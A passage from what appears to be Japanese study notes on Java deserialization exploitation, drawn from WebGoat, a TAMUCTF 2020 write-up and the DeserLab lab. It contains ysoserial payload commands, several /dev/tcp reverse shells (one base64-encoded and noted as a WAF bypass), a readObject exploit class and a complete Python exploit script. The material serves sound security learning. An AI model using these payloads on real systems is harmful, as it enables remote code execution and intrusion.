          String line = br.readLine();

          while (line != null) {
              sb.append(line);
              sb.append(System.lineSeparator());
              line = br.readLine();
          }
          String everything = sb.toString();
          /*
            We cannot use System.out to print the string
            so I decided to insert the result of the exploit inside
             an exception.
            All the unhandled exceptions are kindly sent back to the client.
          */
          IOException e = new
          IOException(everything);
          throw e;
      } finally {
          br.close();
      }
  }

  private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
      exploit();
      in.defaultReadObject();
  }
}
```
## ysoserial Hibernate1 / encode reverse shell payload (OWASP WEBGOAT)
https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef  
- **entrypoint**  
WEBGOATのInsecure Deserializationの項目。  
以下のBurp SuiteのJavaの逆シリアル化の脆弱性を検知できる拡張が便利そう。  
https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java  
error文にHibernate1のPayloadを使えてきなヒントが出てるのかな？？  
ysoserialのやつそのままだとうまく行かなかったらしい(修正されてるのかな？？)  
いろいろなんやかんやして以下のようにしてPaylaodを作成したらしい。  
```txt
java -Dhibernate5 -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/test" | base64 -w0
```
以下のPentest Monkeyのやつは動かなかったらしい。  
```txt
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
最終的に以下が動いたらしい。  
```txt
String cmd = "java.lang.Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"}).waitFor();";
clazz.makeClassInitializer().insertAfter(cmd);
```
`bash -i >& /dev/tcp/[IP address]/[port] 0>&1`を以下のようにエンコードできるらしい！WAFの
バイパスもおまけにできそうで良さげ？  
```txt
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzgwODAgMD4mMQ==}|{base64,-d}|{bash,-i}
```
- **payload**  

## ysoserial Spring / Runtime.exec() ReverseShell Payload with fixed-ysoserial (TAMUCTF2020 Too_Many_Credits)
https://github.com/abinpaul1/CTF-Writeups/blob/master/TAMUCTF%202020%20-%20Too_Many_Credits/README.md  
- **entrypoint**  
Cookieを見るとBase64エンコードされた値`H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA==`がある。  
これをデコードすると意味不明になったため、ファイルに保存して`file`で確認すると`gzip`であることがわかり、それを以下のように解凍するとJavaのシリアライズされたデータであることがわかる。  
```txt
echo -n H4sIAAAAAAAAAFvzloG1uIhBNzk/Vy+5KDUls6QYg87NT0nN0XMG85zzS/NKjDhvC4lwqrgzMTB6MbCWJeaUplYUMEAAEwAKMkv7UgAAAA== | base64 -d | gzip -d >> java_ser_obj
```
SerializationDumperで確認すると、long型のvalueが`0x00 00 00 00 00 00 00 03`に設定されている。この値を大きな値(2億って書いてるけど)にセットしてCookieにセットすればFlagが降ってくるらしい。これが一つ目のFlag。  
  
ysoserialでペイロードをセットする。以下のBruteスクリプトが便利かも？  
https://github.com/NickstaDB/SerialBrute  
JavaのWebアプリなのでSpringをはじめに試して成功したらしい。  
成功したかどうかはエラーページに、`org.codehaus.groovy.runtime.ConvertedClosure`みたいな存在しないクラスの名前が表示されるかどうかでわかるらしい。成功していれば、`No message available`みたいなエラーになるらしい。  
```txt
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 'ping -n 1 8.8.8.8' | gzip | base64 -w0
```
pingは実行できているが、`bash -i >& /dev/tcp/0.0.0.0/8065 0>&1`だとうまく行かなかったらしい。  
Javaの`Runtime.exec`でコマンドを実行するときには、`ls -al`みたいなコマンドは成功するが、Rever shell Paylaodのようなパイプ、リダイレクト、クオーテーションの入ったシェルスクリプトはうまく実行できないらしい。  
これを解決するために、`Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", "command"})`のように配列として渡してやれば複雑なPaylaodも実行できるらしくて、その改良版ysoserialが以下にある。  
https://github.com/pimps/ysoserial-modified  
以下で生成したPayloadでうまく行ったらしい。  
```txt
java -jar ysoserial-modified.jar Spring1 bash 'bash -i >& /dev/tcp/x.x.x.x/8065 0>&1' | gzip | base64 -w0
```
- **Runtime.exec()で実行できるコマンド**  
https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html  
ここに`Runtime.exec`で複雑なシェルスクリプトを実行するための方法が書かれている。  
Paiza上で以下のようにして確認してみた。`exCmd("id")`とかでコマンドを実行する。  
```java
import java.util.*;
import java.io.*;

public class Main {
    public static void exCmd(String args) throws IOException{
	    Process p = Runtime.getRuntime().exec(args);
	    byte[] b = new byte[1];
	
	    while (p.getErrorStream().read(b) > 0)
		    System.out.write(b);
    	while (p.getInputStream().read(b) > 0)
	    	System.out.write(b);
        }

    public static void main(String[] args) throws Exception {
	    exCmd("uname -a");
    }
}
```
実験結果は以下のようになった。つまり、`exCmd("sh -c $@|sh . echo /bin/echo -e 'tab\trequired'");`のようにすれば実行できてるっぽい。  
```txt
exCmd("uname -a");
OK

exCmd("sh -c 'uname'");
OK

exCmd("sh -c 'uname -a'");  これだとダメだった
N

exCmd("sh -c $@ 0 uname -a");
OK

exCmd("sh -c $@|sh . echo uname");
OK

exCmd("sh -c $@|sh . echo uname -a");
OK

exCmd("sh -c $@|sh . echo /bin/echo -e 'tab\trequired'");
OK tab required

exCmd("sh -c $@|sh . echo /bin/echo -e 'tab required'");
OK tab required


exCmd("sh -c $@|sh . echo ps ft");
OK
    PID TTY      STAT   TIME COMMAND
      1 ?        Ss     0:00 sh -c /sbin/ifconfig eth0 > ifconfig.txt; rm ifconfig.txt; LANG=en_US.UTF-8 HOME=/workspace /usr/bin/time -v -o exec_time.txt ./run_user runner3 /usr/bin/java -Dfile.encoding=UTF-8 -Xmx512m -Xms1m -XX:+ShowCodeDetailsInExceptionMessages  Main <exec_stdin.txt >exec_stdout.txt 2>exec_stderr.txt;echo $? > exec_exit_code.txt
      8 ?        S      0:00 /usr/bin/time -v -o exec_time.txt ./run_user runner3 /usr/bin/java -Dfile.encoding=UTF-8 -Xmx512m -Xms1m -XX:+ShowCodeDetailsInExceptionMessages Main
      9 ?        Sl     0:00  \_ /usr/bin/java -Dfile.encoding=UTF-8 -Xmx512m -Xms1m -XX:+ShowCodeDetailsInExceptionMessages Main
     22 ?        S      0:00      \_ sh -c $@|sh . echo ps ft
     24 ?        S      0:00          \_ sh
     25 ?        R      0:00              \_ ps ft
```
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
# DeserLab
## setup
server側は以下でJARファイルを実行して9000ポートで待ち受け。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab/DeserLab-v1.0# java -cp lib/ -jar DeserLab.jar -server localhost 9000
[+] DeserServer started, listening on 127.0.0.1:9000
[+] Connection accepted from 127.0.0.1:59564
[+] Connection accepted from 127.0.0.1:59666
[+] Connection accepted from 127.0.0.1:59688
[+] Connection accepted from 127.0.0.1:59710
[+] Connection accepted from 127.0.0.1:59786
[+] Sending hello...
[+] Hello sent, waiting for hello from client...
[+] Hello received from client...
[+] Sending protocol version...
[+] Version sent, waiting for version from client...
[+] Client version is compatible, reading client name...
[+] Client name received: help
[+] Hash request received, hashing: a
[+] Hash generated: 0cc175b9c0f1b6a831c399e269772661
[+] Done, terminating connection.
```
client側のスクリプトが用意されてる。今回はHttpとかではないのでこのスクリプトを使ってServerと対話する。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab/DeserLab-v1.0# java -cp lib -jar DeserLab.jar -client localhost 9000
[+] DeserClient started, connecting to 127.0.0.1:9000
[+] Connected, reading server hello packet...
[+] Hello received, sending hello to server...
[+] Hello sent, reading server protocol version...
[+] Sending supported protocol version to the server...
[+] Enter a client name to send to the server: 
aaa
[+] Enter a string to hash: 
aa
[+] Generating hash of "aa"...
[+] Hash generated: 4124bc0a9335c27f086f24ba207a4912
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab/DeserLab-v1.0#
```
## serializedデータの抽出
ユーザーネームとMD5ハッシュ化するフレーズを送信すると、MD5ハッシュされたフレーズが返ってくる。この一連の流れをWiresharkで記録する。   
![image](https://user-images.githubusercontent.com/56021519/102015097-d1dc4b80-3d9c-11eb-9f24-06619551f41d.png)   
Javaのシリアライズされたバイト列っぽいものがある。   
![image](https://user-images.githubusercontent.com/56021519/102015144-17007d80-3d9d-11eb-89e0-06429fa4ffa8.png)   
この通信データからシリアライズされたデータだけを取り出したいが、Wireshark上だと作業しにくいので以下のようにtsharkで作業できるように`pcap`ファイルに保存する。   
![image](https://user-images.githubusercontent.com/56021519/102015194-6b0b6200-3d9d-11eb-92aa-58daf8447445.png)   
![image](https://user-images.githubusercontent.com/56021519/102015203-7b234180-3d9d-11eb-95cd-dc0056be2002.png)   
以下のようにtsharkで`src port,data,dst port`となるように出力する。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# tshark -r packet4.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=,
Running as user "root" and group "root". This could be dangerous.
tshark: Lua: Error during loading:
 [string "/usr/share/wireshark/init.lua"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
57032,,8080
8080,,57032
57032,,8080
57032,,8080
8080,,57032
8080,,57032
57032,,8080
57032,,8080
8080,,57032
57032,,8080
8080,,57032
57032,,8080
57032,,8080
57032,,8080
57032,,8080
8080,,57032
8080,,57032
57032,,8080
57034,,8080
8080,,57034
57034,,8080
57034,,8080
8080,,57034
57036,,8080
8080,,57036
57036,,8080
57036,,8080
8080,,57036
8080,,57036
57036,,8080
57036,,8080
8080,,57036
8080,,57036
57036,,8080
8080,,57036
57036,,8080
57036,,8080
8080,,57036
57036,,8080
8080,,57036
57036,,8080
8080,,57036
57036,,8080
57034,,8080
57038,,8080
8080,,57038
57038,,8080
57038,,8080
8080,,57038
8080,,57034
57040,,8080
8080,,57040
57040,,8080
57040,,8080
8080,,57040
8080,,57040
57040,,8080
57040,,8080
8080,,57040
57040,,8080
8080,,57040
57040,,8080
57040,,8080
57040,,8080
8080,,57040
57040,,8080
60974,,9000
9000,,60974
60974,,9000
9000,aced0005,60974
60974,,9000
60974,aced0005,9000
9000,,60974
9000,7704,60974
60974,,9000
9000,f000baaa,60974
60974,,9000
60974,7704,9000
9000,,60974
60974,f000baaa,9000
9000,,60974
9000,7702,60974
60974,,9000
9000,0101,60974
60974,,9000
60974,7702,9000
9000,,60974
60974,0101,9000
9000,,60974
57038,,8080
57044,,8080
8080,,57044
57044,,8080
57044,,8080
8080,,57044
8080,,57038
60974,7707,9000
9000,,60974
60974,000561646d696e,9000
9000,,60974
60974,737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001,9000
9000,,60974
60974,787074000870617373776f7264740000,9000
9000,,60974
9000,737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001,60974
9000,787074000870617373776f72647400203566346463633362356161373635643631643833323764656238383263663939,60974
60974,,9000
60974,,9000
9000,,60974
57044,,8080
57046,,8080
8080,,57046
57046,,8080
57046,,8080
8080,,57046
8080,,57044
57048,,8080
8080,,57048
57048,,8080
57048,,8080
8080,,57048
8080,,57048
57048,,8080
57048,,8080
8080,,57048
57048,,8080
8080,,57048
57048,,8080
57048,,8080
57048,,8080
8080,,57048
57048,,8080
,010000001c00000071269ca454590200518594a45459020000000000,
,080000001400000059350000e3619ca454590200,
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# 
```
このうち、`クライアント->サーバー`の通信を取り出したいので`grep ,9000`をする。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# tshark -r packet4.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep ,9000
Running as user "root" and group "root". This could be dangerous.
tshark: Lua: Error during loading:
 [string "/usr/share/wireshark/init.lua"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
60974,,9000
60974,,9000
60974,,9000
60974,aced0005,9000
60974,,9000
60974,,9000
60974,7704,9000
60974,f000baaa,9000
60974,,9000
60974,,9000
60974,7702,9000
60974,0101,9000
60974,7707,9000
60974,000561646d696e,9000
60974,737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001,9000
60974,787074000870617373776f7264740000,9000
60974,,9000
60974,,9000
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# 
```
このうち、TCP 3way handshakeとかでACKだけのパケットとかもあって見づらいので`grep -v ',,'`でデータがないものを取り除く。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# tshark -r -e data -e tcp.dstport -E separator=, | grep ,9000 | grep -v ',,'
Running as user "root" and group "root". This could be dangerous.
tshark: Lua: Error during loading:
 [string "/usr/share/wireshark/init.lua"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
60974,aced0005,9000
60974,7704,9000
60974,f000baaa,9000
60974,7702,9000
60974,0101,9000
60974,7707,9000
60974,000561646d696e,9000
60974,737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001,9000
60974,787074000870617373776f7264740000,9000
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# 
```
ここから、データだけを取り出したいので`cut -d',' -f2 | tr '\n' ':' | sed s/://g`をする。   
これで`aced0005`から始まるデータを抽出できた！   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# tshark -r packet4.pcap -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep ,9000 | grep -v ',,'| cut -d',' -f2 | tr '\n' ':' | sed s/://g
Running as user "root" and group "root". This could be dangerous.
tshark: Lua: Error during loading:
 [string "/usr/share/wireshark/init.lua"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
aced00057704f000baaa770201017707000561646d696e737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001787074000870617373776f7264740000
```
## endpointの特定
### SerializationDumper
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# java -jar SerializationDumper-v1.13.jar aced00057704f000baaa770201017707000561646d696e737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001787074000870617373776f7264740000

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_BLOCKDATA - 0x77
    Length - 4 - 0x04
    Contents - 0xf000baaa
  TC_BLOCKDATA - 0x77
    Length - 2 - 0x02
    Contents - 0x0101
  TC_BLOCKDATA - 0x77
    Length - 7 - 0x07
    Contents - 0x000561646d696e
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 20 - 0x00 14
        Value - nb.deser.HashRequest - 0x6e622e64657365722e4861736852657175657374
      serialVersionUID - 0xe5 2c e9 a9 2a c1 f9 91
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 10 - 0x00 0a
            Value - dataToHash - 0x64617461546f48617368
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
        1:
          Object - L - 0x4c
          fieldName
            Length - 7 - 0x00 07
            Value - theHash - 0x74686548617368
          className1
            TC_REFERENCE - 0x71
              Handle - 8257537 - 0x00 7e 00 01
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 02
    classdata
      nb.deser.HashRequest
        values
          dataToHash
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 03
                Length - 8 - 0x00 08
                Value - password - 0x70617373776f7264
          theHash
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 04
                Length - 0 - 0x00 00
                Value -  - 0x
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# 
```
Contentsの`0x000561646d696e`には`admin`という入力したユーザーネームが入っている。   
`nb.deser.HashRequest`というオブジェクトがシリアル化されており、`dataToHash`,`theHash`の二つのフィールド(values)を持ち、`dataToHash`の値が`password`であることがわかる。   
   
また、前半の以下のやつから、TC_BLOCKDATAが3つ、TC_OBJECTが1つありことがわかる。最後の一個がシリアル化されたオブジェクトで、前半の3つはそれ以外のデータ。   
`0xac ed 00 05`の後に必ずシリアライズされたデータが来るというわけではないらしい…   
```txt
Contents
  TC_BLOCKDATA - 0x77
    Length - 4 - 0x04
    Contents - 0xf000baaa
  TC_BLOCKDATA - 0x77
    Length - 2 - 0x02
    Contents - 0x0101
  TC_BLOCKDATA - 0x77
    Length - 7 - 0x07
    Contents - 0x000561646d696e
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
```
### jdeserialize
セットアップは以下を参照。   
https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/   
まずpythonでHEXの文字列をBinaryでファイルに書き込む必要がある。   
```txt
>>> open('rawser.bin','wb').write('aaaa'.decode('hex'))
>>> open('rawser.bin','wb').write('aced00057704f000baaa770201017707000561646d696e737200146e622e64657365722e4861736852657175657374e52ce9a92ac1f9910200024c000a64617461546f486173687400124c6a6176612f6c616e672f537472696e673b4c00077468654861736871007e0001787074000870617373776f7264740000'.decode('hex'))
```
Serializerableな`nb.deser.HashRequest`クラスが二つのフィールド`dataToHash`,`theHash`を持つことがわかる。   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# java -cp /opt/jdeserialize/jdeserialize/build/jdeserialize.jar org.unsynchronized.jdeserialize rawser.bin 
read: [blockdata 0x00: 4 bytes]
read: [blockdata 0x00: 2 bytes]
read: [blockdata 0x00: 7 bytes]
read: nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;  
//// BEGIN stream content output
[blockdata 0x00: 4 bytes]
[blockdata 0x00: 2 bytes]
[blockdata 0x00: 7 bytes]
nb.deser.HashRequest _h0x7e0002 = r_0x7e0000;  
//// END stream content output

//// BEGIN class declarations (excluding array classes)
class nb.deser.HashRequest implements java.io.Serializable {
    java.lang.String dataToHash;
    java.lang.String theHash;
}

//// END class declarations

//// BEGIN instance dump
[instance 0x7e0002: 0x7e0000/nb.deser.HashRequest
  field data:
    0x7e0000/nb.deser.HashRequest:
        dataToHash: r0x7e0003: [String 0x7e0003: "password"]
        theHash: r0x7e0004: [String 0x7e0004: ""]
]
//// END instance dump

root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# 
```
## exploit (hardcoding)
通信されてるデータをすべてハードコーディングする。意味わかってなくてもとりあえず成功すればヨシ！的な？   
https://gist.github.com/DiabloHorn/8630948d953386d2ed575e17f8635ee7   
```python
#!/usr/bin/env python
"""
    DiabloHorn - https://diablohorn.com
    References
        https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
        https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html
        https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html
        http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html
        https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
        https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
        https://www.youtube.com/watch?v=VviY3O-euVQ
        http://wouter.coekaerts.be/2015/annotationinvocationhandler
        http://www.baeldung.com/java-dynamic-proxies
        https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy
        https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical
"""
import sys
import socket
import argparse
import logging
import struct

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class deser:
    def __init__(self,tip,tport):
        self.targetip = tip
        self.targetport = int(tport)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        self.s.connect((self.targetip, self.targetport))
    
    def javaserial(self):
        blob = '\xac\xed\x00\x05'
        self.s.sendall(blob)
        logging.debug("server javaserial resp: %s" % self.s.recv(4).encode('hex'))    
    
    def protohello(self):
        header = self.s.recv(2)
        datalength = int(struct.unpack('B',header[1])[0])
        logging.debug("server proto hello %s" % self.s.recv(datalength).encode('hex'))
        blob = '\x77\x04'
        blob2 = '\xf0\x00\xba\xaa'
        self.s.sendall(blob)
        self.s.sendall(blob2)
        
    def protoversion(self):
        header = self.s.recv(2)
        datalength = int(struct.unpack('B',header[1])[0])
        logging.debug("server version %s" % self.s.recv(datalength).encode('hex'))
        blob = '\x77\x02'
        blob2 = '\x01\x01'
        self.s.sendall(blob)
        self.s.sendall(blob2)
          
    def clientname(self):
        blob = '\x77\x09' #depends on username + type length
        blob2 = '\x00\x07\x74\x65\x73\x74\x69\x6e\x67'
        self.s.sendall(blob)
        self.s.sendall(blob2)
    
    def exploit(self, payload_file):
        """
            Normally this is where the HashRequest object is send
            instead we send a ysoserial payload, skipping the first 4 bytes
        """
        payload = ''
        with open(payload_file, 'rb') as content_file:
            payload = content_file.read()
        self.s.sendall(payload[4:])
        logging.debug('after exploit: %s' % self.s.recv(1024))
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit for DeserLab',epilog='https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/')
    parser.add_argument('targetip',help='target ip to exploit')
    parser.add_argument('targetport',help='target port to exploit')
    parser.add_argument('payloadfile',help='file with the ysoserial payload')

    myargs = parser.parse_args()
    
    logging.debug("target %s" % myargs.targetip)
    logging.debug("port %s" % myargs.targetport)
    mydeser = deser(myargs.targetip, myargs.targetport)
    logging.info("Connecting")
    mydeser.connect()
    logging.info("java serialization handshake")
    mydeser.javaserial()
    logging.info("protocol specific handshake")
    mydeser.protohello()
    logging.info("protocol specific version handshake")
    mydeser.protoversion()
    logging.info("sending name of connected client")
    mydeser.clientname()
    logging.info("exploiting")
    mydeser.exploit(myargs.payloadfile)
```
これで`ping 127.0.0.1`が実行できている！   
```txt
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# python deserlab_exploit.py 127.0.0.1 9000 payload.bin 
2020-12-14 03:19:04,793 - DEBUG - target 127.0.0.1
2020-12-14 03:19:04,793 - DEBUG - port 9000
2020-12-14 03:19:04,793 - INFO - Connecting
2020-12-14 03:19:04,794 - INFO - java serialization handshake
2020-12-14 03:19:04,795 - DEBUG - server javaserial resp: aced0005
2020-12-14 03:19:04,796 - INFO - protocol specific handshake
2020-12-14 03:19:04,835 - DEBUG - server proto hello f000baaa
2020-12-14 03:19:04,836 - INFO - protocol specific version handshake
2020-12-14 03:19:04,928 - DEBUG - server version 0101
2020-12-14 03:19:04,928 - INFO - sending name of connected client
2020-12-14 03:19:04,928 - INFO - exploiting
2020-12-14 03:19:04,982 - DEBUG - after exploit: srjava.lang.ClassCastException���g�\
root@kali:~/Documents/AWAE/javaDeserialization/DeserLab# 
```
![image](https://user-images.githubusercontent.com/56021519/102057416-3b0d9e80-3e31-11eb-90e8-572c99862f37.png)   
## manually exploit
ysoserialの部分を自作する的な？   
https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical   
```txt
The MethodClosure class in runtime/MethodClosure.java in Apache Groovy 1.7.0 through 2.4.3 allows remote attackers to execute arbitrary code or cause a denial of service via a crafted serialized object.
```
Apache GroovyのMethodClosureクラスが`MethodClosure method = new MethodClosure(command, "execute");`みたいにしてインスタンスを作成するだけでコードが実行されてしまうことが問題？ではない！MethodClosureクラスがデシリアライズ可能なことが問題。このクラスはインスタンスを作成するだけでコードが実行されてしまう仕様なのでそもそもデシリアライズしないようにする必要がある！   
   
entrypointをMyClassとして以下の概略に示す。   
つまり、MyClassのthis.map.putメソッドが呼び出されたら最終的に`new DynamicInvocationHandler()`ハンドラーが実行されるようにする。   
```java
import java.util.*;
import java.lang.reflect.*;

public class Main {
    public static void main(String[] args) throws Exception {
        // 動的プロキシを作成。
	// Map型なので、proxyinstanceでMapクラスのメソッドを呼び出すと、DynamicInvocationHandlerのinvokeメソッドを経由して実行する
        Map proxyInstance = (Map) Proxy.newProxyInstance(
            Main.class.getClassLoader(),
        new Class[]{ Map.class },
        new DynamicInvocationHandler());
        
	// つまりこれでプロキシ経由でinvokeメソッドもputメソッドも実行する
        //proxyInstance.put("hello", "world");  // DynamicProxy:before
        
        String className = "MyClass";
	// リフレクションでインスタンスを作成する。finalとかprivateメソッドにもアクセスできるらしい
        Constructor<?> constructor = Class.forName(className).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        // MyClassのインスタンスを作成する。これは、
	// InvocationHandler secondInvocationHandler = new MyClass(proxyInstance); と同じ
	// InvocationHandlerにしてるのはMyClassのインターフェースだから(?)
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(proxyInstance); 
	// これで、
	// DynamicProxy:before
	// と表示される。(インスタンスが作成されたことでMyClassのコンストラクタが呼び出され、プロキシのinvokeも呼びだされるから)
  
    }
}

// このクラスがentrypoint
// this.map.put()メソッドが呼び出されると、invoke()内の任意の処理を実行できるようにしたい！
// つまり、putメソッドが呼び出されるといろいろチェーンして最終的にRCEできる、最初の発火点
class MyClass implements InvocationHandler{
    private Map map;
    
    public MyClass(Map map){
        this.map = map;
        this.map.put("hello", "world");
    }
    // ここはどうでもいい
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("MyClass:before");
        return 42;
    }
}

// entrypointでputが呼び出されたときのためのhandler
// ここではinvokeメソッドをputの前に実行する
class DynamicInvocationHandler implements InvocationHandler {
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("DynamicProxy:before");
        return 42;
    }
}
```
ここで、MyClassとしたものは実際には以下の`AnnotationInvocationHandler`で、ここをentrypointとすることが多いらしい。   
```java
// このクラスをシリアライズすれば、デシリアライズ時にreadObject()内のmemberValues.entrySet()を実行するのでentrypointに使いやすい
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658399397L;
    private final Map<String, Object> memberValues;
    
	private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException {
		// *snip*
				
		for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
		    // *snip*
		}
	}
}
```
また、`new DynamicInvocationHandler()`ハンドラーが実行できるようになる部分は実際には、以下の`closure`が実行できるようになる。   
```java
// "entrySet"が実行されれば"new MethodClosure("ping 127.0.0.1", "execute")"を実行してインスタンスを作成する。これは""ping 127.0.0.1".execute()"と同義らしい
final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("ping 127.0.0.1", "execute"), "entrySet");
```
実際のソースコードは以下を参照   
https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7   

# 参考
https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/   
基本的なJavaの逆シリアライズの脆弱性について   
https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview   
チートシート。よくわからん   
https://github.com/frohoff/ysoserial   
ysoserialの使い方的な。   
https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical   
Apache Groovy(CVE-2015-3253)の解説記事   
https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/   
DeserLabの解説記事。神。ゴッド。   
https://github.com/NickstaDB/SerialBrute/   
ysoserialのどれが刺さるか不明なときに全部試してくれるスクリプト   
